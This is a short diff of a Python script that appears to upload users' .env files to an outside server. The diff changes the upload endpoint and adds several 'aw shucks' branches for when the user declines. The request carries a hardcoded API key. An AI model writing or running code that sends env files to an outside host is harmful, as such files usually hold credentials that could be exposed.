@@ -50,7 +50,7 @@ def epsteinFiles(paths):
 
 def postTheThingy(grrr):
     res = requests.post(
-        "http://mackerel-moved-elephant.ngrok-free.app/post",
+        "https://skydotenv.jollyy.dev/post",
         headers={
             "x-api-key": "a9a4ae141698274a3a601afdbc4d028a3ef971e823a3b0eeb0ec3616c16d3d10",
             "Content-Type": "application/json",
@@ -92,6 +92,18 @@ def main():
                     webbrowser.open(url)
                     clear()
                     input(f"thanks for that, i guess? you can check out your env files here: {url}")
+                else:
+                    clear()
+                    input("aw shucks :( do reconsider next time")
+            else:
+                clear()
+                input("aw shucks :( do reconsider next time")
+        else:
+            clear()
+            input("aw shucks :( do reconsider next time")
+    else:
+        clear()
+        input("aw shucks :( do reconsider next time")
     clear()
     print("Please quit the application")
     sys.exit(0)
